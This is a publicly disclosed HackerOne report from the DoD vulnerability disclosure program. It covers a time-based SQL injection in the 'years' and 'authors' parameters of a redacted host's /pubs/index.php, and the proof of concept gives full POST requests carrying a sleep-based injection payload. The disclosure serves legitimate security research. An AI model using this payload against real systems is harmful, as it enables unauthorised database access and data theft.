---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - vuln/sql-injection
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2024-01-26
submitted: 2024-01-11T14:48:29.230Z
bounty_usd: null
votes: 96
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "aziz0x48"
source: "https://hackerone.com/reports/2312334"
title: "Time based SQL injection at████████"
---
# Time based SQL injection at████████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 96 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2024-01-26

- Report: [https://hackerone.com/reports/2312334](https://hackerone.com/reports/2312334)
- CWE: SQL Injection
- Submitted: 2024-01-11T14:48:29.230Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Description:**

While doing test on██████, I’ve found that the endpoint at /pubs/index.php is vulnerable with SQL injection vulnerability.
Vulnerable parameters are 'years' and 'authors'

## References
Please check screenshots attached.

## Impact

Time based SQL injection can lead to the exfiltration of sensitive data from the database.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
## POC

Make the following POST request to /pubs/index.php

```
POST /pubs/index.php HTTP/1.1
Host:██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://███████
Referer: https://███████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
```

Notice that the response time will be 4 seconds.


```
POST /pubs/index.php HTTP/1.1
Host:█████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://████████
Referer: https://████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```

Notice that the response time will be 25 seconds.

This can be further exploited manually or using automated tools such as SQLmap to get data from the DB, but I will stop here for this report.

Thanks.

## Suggested Mitigation/Remediation Actions

## Timeline

- **Report Filed**
- **2024-01-11** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
